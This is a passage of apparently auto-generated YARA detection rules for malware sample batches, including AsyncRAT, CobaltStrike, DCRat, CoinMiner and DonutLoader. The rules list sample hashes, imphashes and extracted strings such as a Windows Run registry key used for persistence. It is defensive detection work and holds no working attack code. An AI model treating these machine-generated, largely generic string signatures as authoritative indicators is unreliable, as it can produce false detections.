      $s9 = "regexp/syntax.dumpProg" fullword ascii /* score: '14.00'*/
      $s10 = "regexp.Compile" fullword ascii /* score: '14.00'*/
      $s11 = "log.init.func1" fullword ascii /* score: '12.00'*/
      $s12 = "os.readFileContents" fullword ascii /* score: '12.00'*/
      $s13 = "regexp.(*Regexp).get" fullword ascii /* score: '12.00'*/
      $s14 = "regexp/syntax.Compile" fullword ascii /* score: '11.00'*/
      $s15 = "regexp/syntax.(*compiler).compile" fullword ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__72d757ad_d42595b695fc008ef2c56aabd8efd68e_imphash__c95056c2_41 {
   meta:
      description = "_subset_batch - from files d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash2 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
   strings:
      $s1 = "github.com/go-ole/go-ole.GetUserDefaultLCID" fullword ascii /* score: '25.00'*/
      $s2 = "github.com/go-ole/go-ole.(*IDispatch).GetSingleIDOfName" fullword ascii /* score: '22.00'*/
      $s3 = "github.com/go-ole/go-ole.getIDsOfName" fullword ascii /* score: '22.00'*/
      $s4 = "github.com/go-ole/go-ole/oleutil.GetProperty" fullword ascii /* score: '22.00'*/
      $s5 = "github.com/go-ole/go-ole.(*IDispatch).GetIDsOfName" fullword ascii /* score: '22.00'*/
      $s6 = "github.com/go-ole/go-ole.(*IDispatch).InvokeWithOptionalArgs" fullword ascii /* score: '21.00'*/
      $s7 = "github.com/go-ole/go-ole.(*EXCEPINFO).Error" fullword ascii /* score: '20.00'*/
      $s8 = "github.com/go-ole/go-ole.NewError" fullword ascii /* score: '20.00'*/
      $s9 = "github.com/go-ole/go-ole.(*OleError).Error" fullword ascii /* score: '20.00'*/
      $s10 = "github.com/go-ole/go-ole.EXCEPINFO.Error" fullword ascii /* score: '20.00'*/
      $s11 = "github.com/go-ole/go-ole.NewErrorWithSubError" fullword ascii /* score: '20.00'*/
      $s12 = "github.com/go-ole/go-ole.(*OleError).String" fullword ascii /* score: '20.00'*/
      $s13 = "github.com/go-ole/go-ole.convertHresultToError" fullword ascii /* score: '20.00'*/
      $s14 = "github.com/go-ole/go-ole.decodeHexUint16" fullword ascii /* score: '19.00'*/
      $s15 = "syscall.GetProcessTimes" fullword ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__16a1317a_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_42 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_16a1317a.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_aa5c7d69.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cf81bd30.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ff37506f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "16a1317ad2b3a3464c1c97066ce8329a96b226607760393c29eb145e8c7c666c"
      hash2 = "aa5c7d69d06c6fe831464fe03e9ad4e58fb0e49f0c70b1b56741db2fd758154e"
      hash3 = "cf81bd30b1d48f5a189ce44e19651e2d20d652ee0e05aa3efcb97485e6c8fd17"
      hash4 = "ff37506f2c1d82d61f2eadefe66a685d1142d29b7790d90b76c5969a282cc752"
   strings:
      $s1 = "ProcessIsTerminating" fullword ascii /* score: '15.00'*/
      $s2 = "GetExportAddress" fullword ascii /* score: '12.00'*/
      $s3 = "GetLoadedModuleAddress" fullword ascii /* score: '12.00'*/
      $s4 = "GetLibraryAddress" fullword ascii /* score: '12.00'*/
      $s5 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" fullword wide /* score: '10.00'*/
      $s6 = "Failed to parse module exports." fullword wide /* score: '10.00'*/
      $s7 = "b64encoded" fullword ascii /* score: '9.00'*/
      $s8 = ", Dll was not found or not loaded." fullword wide /* score: '9.00'*/
      $s9 = "Could not get the handle for the function." fullword wide /* score: '9.00'*/
      $s10 = "DInvokeCore" fullword ascii /* score: '8.00'*/
      $s11 = "\\\\{0}\\root\\CIMV2" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _BillGates_signature__BillGates_signature__2869d529_DNSAmp_signature__Do_loo_signature__43 {
   meta:
      description = "_subset_batch - from files BillGates(signature).elf, BillGates(signature)_2869d529.elf, DNSAmp(signature).elf, Do-loo(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f1421e5744e8e9c53d26f5c5d27fed9701de331e2c590e8dc824c4e7b0468f08"
      hash2 = "2869d529c43385893d1fe718a1b9aebb16009e4f7dca75f82bd402b92bdc9735"
      hash3 = "3f9edebbf0ba0a22729ec6324d6601e10cb44c84d4c9bd1af97aec64d22789d8"
      hash4 = "14df565ad794f723733f5db396ddcb5be4d43cffc4bad7dabd1f18193a0049a5"
   strings:
      $s1 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* score: '19.00'*/ /* hex encoded string '3333' */
      $s2 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s3 = "ELF load command address/offset not properly aligned" fullword ascii /* score: '15.00'*/
      $s4 = "invalid target namespace in dlmopen()" fullword ascii /* score: '14.00'*/
      $s5 = "DYNAMIC LINKER BUG!!!" fullword ascii /* score: '13.00'*/
      $s6 = "%s: Symbol `%s' has different size in shared object, consider re-linking" fullword ascii /* score: '12.50'*/
      $s7 = "%s: error: %s: %s (%s)" fullword ascii /* score: '12.50'*/
      $s8 = "symbol=%s;  lookup in file=%s [%lu]" fullword ascii /* score: '12.50'*/
      $s9 = "*** %n in writable segment detected ***" fullword ascii /* score: '12.00'*/
      $s10 = "unsupported version " fullword ascii /* score: '12.00'*/
      $s11 = "ISO/IEC JTC1/SC22/WG20 - internationalization" fullword ascii /* score: '12.00'*/
      $s12 = "error while loading shared libraries" fullword ascii /* score: '12.00'*/
      $s13 = "failed to map segment from shared object" fullword ascii /* score: '12.00'*/
      $s14 = "symbol lookup error" fullword ascii /* score: '12.00'*/
      $s15 = "*** invalid %N$ use detected ***" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _BlankGrabber_signature__33742414196e45b8b306a928e178f844_imphash__CoinMiner_signature__dcaf48c1f10b0efa0a4472200f3850ed_imp_44 {
   meta:
      description = "_subset_batch - from files BlankGrabber(signature)_33742414196e45b8b306a928e178f844(imphash).exe, CoinMiner(signature)_dcaf48c1f10b0efa0a4472200f3850ed(imphash)_1a3b95a5.exe, dcaf48c1f10b0efa0a4472200f3850ed(imphash)_1a88146b.exe, dcaf48c1f10b0efa0a4472200f3850ed(imphash)_a990bd13.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3b056c633ea73f56ebe83ea1030b4fc5e9d270eee6bb9b3de8b660fe40bf01cf"
      hash2 = "1a3b95a51b678ad1377e7fe671933ccba1056563003d5db181ad7c2d2936edf7"
      hash3 = "1a88146b43782a3547bcc06236a4b224592c1602a9691b58d60be1c08e4fa4b7"
      hash4 = "a990bd137feb5751e17c135c6b11fcaf6a7f09d1b3935b2d76ebfd0d53a2f027"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s2 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s3 = "VCRUNTIME140.dll" fullword wide /* score: '26.00'*/
      $s4 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
      $s5 = "VCRUNTIME140_1.dll" fullword wide /* score: '23.00'*/
      $s6 = "Failed to extract %s: failed to open target file!" fullword ascii /* score: '22.50'*/
      $s7 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide /* score: '22.00'*/
      $s8 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s9 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide /* score: '22.00'*/
      $s10 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s11 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide /* score: '22.00'*/
      $s12 = "%s%c%s.exe" fullword ascii /* score: '20.00'*/
      $s13 = "Failed to initialize security descriptor for temporary directory!" fullword ascii /* score: '20.00'*/
      $s14 = "LOADER: failed to set the TMP environment variable." fullword wide /* score: '19.00'*/
      $s15 = "Failed to create child process!" fullword wide /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _d1cea82e786317a9f928832b3c274bd4_imphash__d1cea82e786317a9f928832b3c274bd4_imphash__1dc48951_d1cea82e786317a9f928832b3c274b_45 {
   meta:
      description = "_subset_batch - from files d1cea82e786317a9f928832b3c274bd4(imphash).exe, d1cea82e786317a9f928832b3c274bd4(imphash)_1dc48951.exe, d1cea82e786317a9f928832b3c274bd4(imphash)_4d2d6c58.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2ecfdc00fd003a0abd1cd226b10a0efd99b03cf2685fe061b8597bc7eab548d4"
      hash2 = "1dc48951a9fba6872c625ee54333b8a37b0b39b3fde52e6481af9b964a8b9a23"
      hash3 = "4d2d6c58df17bc95268962737a5f6233f446d525c207caa2ceef0d8758c1bf3f"
   strings:
      $s1 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s2 = "UnpadErrorInvalidByteInvalidLengthInvalidLastSymbolInvalidPaddingdecoded length calculation overflowE:\\Env\\Rust\\.cargo\\regis" ascii /* score: '23.00'*/
      $s3 = "UnpadErrorInvalidByteInvalidLengthInvalidLastSymbolInvalidPaddingdecoded length calculation overflowE:\\Env\\Rust\\.cargo\\regis" ascii /* score: '23.00'*/
      $s4 = "ectedaddress in useaddress not availablenetwork downbroken pipeentity already existsoperation would blocknot a directoryis a dir" ascii /* score: '20.00'*/
      $s5 = "internal error: entered unreachable codeE:\\Env\\Rust\\.rustup\\toolchains\\nightly-2024-06-26-x86_64-pc-windows-msvc\\lib\\rust" ascii /* score: '19.00'*/
      $s6 = "\\\\fatal runtime error: I/O error: operation failed to complete synchronously" fullword ascii /* score: '19.00'*/
      $s7 = "fatal runtime error: I/O error: operation failed to complete synchronously" fullword ascii /* score: '18.00'*/
      $s8 = "\\rust\\library\\std\\src\\thread\\mod.rsE:\\Env\\Rust\\.rustup\\toolchains\\nightly-2024-06-26-x86_64-pc-windows-msvc\\lib\\rus" ascii /* score: '17.00'*/
      $s9 = "?E:\\Env\\Rust\\.rustup\\toolchains\\nightly-2024-06-26-x86_64-pc-windows-msvc\\lib\\rustlib\\src\\rust\\library\\alloc\\src\\sy" ascii /* score: '16.00'*/
      $s10 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
      $s11 = "lock count overflow in reentrant mutexlibrary\\std\\src\\sync\\reentrant_lock.rs" fullword ascii /* score: '15.00'*/
      $s12 = "E:\\Env\\Rust\\.cargo\\registry\\src\\rsproxy.cn-0dccff568467c15b\\base64-0.20.0\\src\\engine\\fast_portable\\decode_suffix.rs" fullword ascii /* score: '14.00'*/
      $s13 = "Once instance has previously been poisoned" fullword ascii /* score: '14.00'*/
      $s14 = "ist too longoperation interruptedunsupportedunexpected end of fileout of memoryother erroruncategorized error (os error )" fullword ascii /* score: '14.00'*/
      $s15 = "E:\\Env\\Rust\\.cargo\\registry\\src\\rsproxy.cn-0dccff568467c15b\\base64-0.20.0\\src\\engine\\fast_portable\\decode.rs" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and pe.imphash() == "d1cea82e786317a9f928832b3c274bd4" and ( 8 of them )
      ) or ( all of them )
}

rule _CobaltStrike_signature__f668fce5020bf868ac72f3f764327e2a_imphash__CoinMiner_signature__c041a8a2b2709d639d9e4e2709f2e017_imp_46 {
   meta:
      description = "_subset_batch - from files CobaltStrike(signature)_f668fce5020bf868ac72f3f764327e2a(imphash).exe, CoinMiner(signature)_c041a8a2b2709d639d9e4e2709f2e017(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ccf101ea9a1ae213b93a7d9b6dc7295803ec7003024966da49f5f7c8438a4145"
      hash2 = "9fd2b2df1f8c6ae82d50916c642019118ec3af56f650d8a9036c39f10d67ebeb"
   strings:
      $s1 = ".GNU C99 15.2.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin" fullword ascii /* score: '15.00'*/
      $s2 = "GNU C99 15.2.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin" fullword ascii /* score: '12.00'*/
      $s3 = "+GNU C99 15.2.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin" fullword ascii /* score: '12.00'*/
      $s4 = "8GNU C99 15.2.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin" fullword ascii /* score: '12.00'*/
      $s5 = "9GNU C99 15.2.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin" fullword ascii /* score: '12.00'*/
      $s6 = "#__mingwthr_run_key_dtors" fullword ascii /* score: '10.00'*/
      $s7 = "?__report_error" fullword ascii /* score: '10.00'*/
      $s8 = "pNTHeader64" fullword ascii /* score: '10.00'*/
      $s9 = "D:\\W\\B\\src\\build-MINGW64" fullword ascii /* score: '10.00'*/
      $s10 = "B_IMAGE_NT_HEADERS64" fullword ascii /* score: '9.00'*/
      $s11 = "'pNTHeader32" fullword ascii /* score: '9.00'*/
      $s12 = "H__mingw_module_is_dll" fullword ascii /* score: '9.00'*/
      $s13 = " _IMAGE_NT_HEADERS64" fullword ascii /* score: '9.00'*/
      $s14 = "D:/W/B/src/mingw-w64/mingw-w64-crt/crt/dllargv.c" fullword ascii /* score: '9.00'*/
      $s15 = "_configthreadlocale.c" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AveMariaRAT_signature__c149ad8b73121762d33844ffa5c7ca51_imphash__b069d88b33e75313d6c2f825eb1f4188_imphash__47 {
   meta:
      description = "_subset_batch - from files AveMariaRAT(signature)_c149ad8b73121762d33844ffa5c7ca51(imphash).exe, b069d88b33e75313d6c2f825eb1f4188(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a868126d10484d16bad327ab13861c0a479a7d809a567d8623cf720d2c31022d"
      hash2 = "f33b9f92f7844ac3e037328500c492c231ad480658f63f5a3f306d4899b1509d"
   strings:
      $s1 = "BTryEnsureSufficientExecutionStack.GetSufficientStackLimit" fullword ascii /* score: '24.00'*/
      $s2 = "FinishStageTwo FinishStageThreeJNotifyParentIfPotentiallyAttachedTask,ProcessChildCompletion@" fullword ascii /* score: '23.00'*/
      $s3 = "*ExecuteFromThreadPool@" fullword ascii /* score: '18.00'*/
      $s4 = "The output char buffer is too small to contain the decoded characters, encoding '{0}' fallback '{1}'" fullword wide /* score: '18.00'*/
      $s5 = "&InitCultureDataCore InitUserOverride$GetTimeFormatsCore@" fullword ascii /* score: '17.00'*/
      $s6 = "$ExecuteEntryUnsafeVExecuteEntryCancellationRequestedOrCanceled,ExecuteWithThreadLocal@" fullword ascii /* score: '17.00'*/
      $s7 = ".ReflectionCoreExecution" fullword ascii /* score: '16.00'*/
      $s8 = "The output byte buffer is too small to contain the encoded data, encoding '{0}' fallback '{1}'" fullword wide /* score: '16.00'*/
      $s9 = "UninitializeComDInitializeExistingThreadPoolThread2get_ReentrantWaitsEnabled.GetCurrentApartmentType" fullword ascii /* score: '15.00'*/
      $s10 = ".CompletionActionInvoker" fullword ascii /* score: '15.00'*/
      $s11 = "&GetReadNotSupported&GetSeekNotSupported(GetWriteNotSupported" fullword ascii /* score: '15.00'*/
      $s12 = "8GetSystemSupportsLeapSeconds>GetGetSystemTimeAsFileTimeFnPtr" fullword ascii /* score: '15.00'*/
      $s13 = "bTryStartProcessingHighPriorityWorkItemsAndDequeue@" fullword ascii /* score: '15.00'*/
      $s14 = "xSystem.Collections.Generic.IEnumerable<TValue>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s15 = "RegistryKey.GetValue does not support values with more than Int32.MaxValue bytes" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _CoinMiner_signature__dcaf48c1f10b0efa0a4472200f3850ed_imphash__1a3b95a5_dcaf48c1f10b0efa0a4472200f3850ed_imphash__a990bd13_48 {
   meta:
      description = "_subset_batch - from files CoinMiner(signature)_dcaf48c1f10b0efa0a4472200f3850ed(imphash)_1a3b95a5.exe, dcaf48c1f10b0efa0a4472200f3850ed(imphash)_a990bd13.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1a3b95a51b678ad1377e7fe671933ccba1056563003d5db181ad7c2d2936edf7"
      hash2 = "a990bd137feb5751e17c135c6b11fcaf6a7f09d1b3935b2d76ebfd0d53a2f027"
   strings:
      $s1 = "multiprocessing.spawn)" fullword ascii /* score: '21.00'*/
      $s2 = "spyi_rth_multiprocessing" fullword ascii /* score: '20.00'*/
      $s3 = "asyncio.log)" fullword ascii /* score: '19.00'*/
      $s4 = "multiprocessing.connection)" fullword ascii /* score: '18.00'*/
      $s5 = "multiprocessing.shared_memory)" fullword ascii /* score: '18.00'*/
      $s6 = "multiprocessing.synchronize)" fullword ascii /* score: '18.00'*/
      $s7 = "multiprocessing.util)" fullword ascii /* score: '18.00'*/
      $s8 = "asyncio.base_subprocess)" fullword ascii /* score: '18.00'*/
      $s9 = "multiprocessing.reduction)" fullword ascii /* score: '18.00'*/
      $s10 = "multiprocessing.context)" fullword ascii /* score: '18.00'*/
      $s11 = "multiprocessing.forkserver)" fullword ascii /* score: '18.00'*/
      $s12 = "multiprocessing.popen_fork)" fullword ascii /* score: '18.00'*/
      $s13 = "asyncio.subprocess)" fullword ascii /* score: '18.00'*/
      $s14 = "!multiprocessing.popen_spawn_win32)" fullword ascii /* score: '18.00'*/
      $s15 = "multiprocessing.queues)" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and pe.imphash() == "dcaf48c1f10b0efa0a4472200f3850ed" and ( 8 of them )
      ) or ( all of them )
}

rule _CobaltStrike_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__dd56a47d6b039b230286c0327d6693062fc843602ac0e361321473550_49 {
   meta:
      description = "_subset_batch - from files CobaltStrike(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed_dd56a47d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4390de792c33fb358e49444f5c40349d2f0929ccf1820b98bc4c29cd08ef475c"
      hash2 = "dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed"
   strings:
      $s1 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.traceGCSweepSpan" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.traceGCSweepStart" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.getargp" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.getRandomData" fullword ascii /* score: '15.00'*/
      $s6 = "sync.(*Mutex).lockSlow" fullword ascii /* score: '15.00'*/
      $s7 = "sync.(*Mutex).unlockSlow" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.traceGCSweepDone" fullword ascii /* score: '15.00'*/
      $s9 = "runtime/internal/atomic.(*Uintptr).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s10 = "runtime/internal/atomic.(*Uint32).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s11 = "runtime.int64Hash" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.addOneOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.traceBufPtr.ptr" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.runOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.addOneOpenDeferFrame.func1" fullword ascii /* score: '13.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 17000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__DCRat_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__3ef18_50 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash).exe, DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_3ef183c1.exe, DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_bca5ffb9.exe, DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_cfc77b95.exe, DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_da0732b5.exe, DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_def52e7b.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash).exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_3be674bc.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_f2420fdc.exe, DonutLoader(signature)_492a5d3560401c2811de048088bf91d0(imphash).exe, DonutLoader(signature)_492a5d3560401c2811de048088bf91d0(imphash)_4e4a3751.exe, DonutLoader(signature)_492a5d3560401c2811de048088bf91d0(imphash)_76889ef2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7d398ca598c96de79cbdaaa3dc88abf06da245c7cd2c53b7f6f6bf3732b3b46b"
      hash2 = "3ef183c187c16072e3d1644a20f080d8c39727ed1d25e8c869748979825d26db"
      hash3 = "bca5ffb9737d1a5153b454a1ad91c91340c7176b31ef102f7958042818e031fa"
      hash4 = "cfc77b951766dcdaee1adc05717ebb379972293ea21f8967dfc507e3b1f5e424"
      hash5 = "da0732b540cf55107d03e09ffcf0d6c57a733c01a9ccac2c0fcd7ec2cf24f12d"
      hash6 = "def52e7b2167ed5ff5d2e0b514558328efac9ddf0ece129dd9ce87046d43a6d3"
      hash7 = "5e44dddfbb8bcddff6231529beff64d1f5a20be2fde1356dd7a0c4e82a72a468"
      hash8 = "3be674bc5cbe26b2934b4d4e84651e10afc426d38c7787682f674b9edb77633f"
      hash9 = "f2420fdc9492498195a8a0bae43cfbf7c721b18c43b55ccfecf941f06164b154"
      hash10 = "7c74d74c6d6a4ffc724a7800ddf18e165e582e2e4b0aace1b5266ec3d25a9775"
      hash11 = "4e4a3751581252e210f6f45881d778d1f482146f92dc790504bfbcd2bdfa0129"
      hash12 = "76889ef23dc327c0a63da2e296e079ce1f6844da185c3160402341557e6bccfa"
   strings:
      $x1 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x2 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x3 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x4 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x5 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s6 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s7 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s8 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s9 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s10 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s11 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
      $s12 = "WINNSI.DLL" fullword wide /* score: '23.00'*/
      $s13 = "Cannot create folder %sHChecksum error in the encrypted file %s. Corrupt file or wrong password." fullword wide /* score: '21.00'*/
      $s14 = "$GETPASSWORD1:IDC_PASSWORDENTER" fullword ascii /* score: '17.00'*/
      $s15 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_CobaltStrike_signature__d42595b695fc008ef2c56aabd_51 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash3 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash4 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
   strings:
      $s1 = "runtime.getOrAddWeakHandle" fullword ascii /* score: '15.00'*/
      $s2 = "}]; internal/sync.dead sync/atomic.Bool; internal/sync.mu internal/sync.Mutex; internal/sync.parent *internal/sync.indirect[go.s" ascii /* score: '15.00'*/
      $s3 = "sync/atomic.(*Pointer[go.shape.struct { internal/sync.node = internal/sync.node[go.shape.*internal/abi.Type,go.shape.interface {" ascii /* score: '15.00'*/
      $s4 = "runtime.getWeakHandle" fullword ascii /* score: '15.00'*/
      $s5 = "sync/atomic.(*Pointer[go.shape.struct { internal/sync.node = internal/sync.node[go.shape.*internal/abi.Type,go.shape.interface {" ascii /* score: '15.00'*/
      $s6 = "0*struct { key net.hostLookupOrder; elem string }" fullword ascii /* score: '12.00'*/
      $s7 = "2*[]struct { key net.hostLookupOrder; elem string }" fullword ascii /* score: '12.00'*/
      $s8 = "3*[8]struct { key net.hostLookupOrder; elem string }" fullword ascii /* score: '12.00'*/
      $s9 = "%*map.group[net.hostLookupOrder]string" fullword ascii /* score: '12.00'*/
      $s10 = "sync/atomic.(*Bool).CompareAndSwap" fullword ascii /* score: '11.00'*/
      $s11 = "runtime.gcParkStrongFromWeak" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.panicnildottype" fullword ascii /* score: '10.00'*/
      $s13 = "/sync.key go.shape.*internal/abi.Type; internal/sync.value go.shape.interface {} }]).Load" fullword ascii /* score: '10.00'*/
      $s14 = "type:.hash.net/netip.addrDetail" fullword ascii /* score: '10.00'*/
      $s15 = "/sync.key go.shape.*internal/abi.Type; internal/sync.value go.shape.interface {} }]).Store" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_d42595b695fc008ef2c56aabd8efd68e_imphash__72d757a_52 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash3 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
   strings:
      $s1 = "=*struct { F uintptr; X0 *exec.Cmd; X1 chan<- exec.ctxResult }" fullword ascii /* score: '24.00'*/
      $s2 = "0*struct { F uintptr; X0 *os.File; X1 *exec.Cmd }" fullword ascii /* score: '20.00'*/
